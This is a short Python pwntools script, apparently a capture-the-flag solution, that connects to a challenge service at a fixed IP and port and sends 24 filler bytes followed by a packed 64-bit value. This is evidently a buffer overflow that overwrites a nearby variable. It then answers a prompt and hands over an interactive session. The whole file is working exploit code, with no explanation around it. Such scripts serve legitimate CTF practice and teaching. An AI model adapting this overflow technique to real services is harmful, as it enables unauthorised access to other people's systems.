from pwn import *

ip = "140.110.112.77"
port = 6131

context.arch = "amd64"

r = remote(ip, port)
# r = process("./secret")

r.sendlineafter(":", flat("a" * 24, 0xab3700000000))
r.sendlineafter("?", "Y")

r.interactive()
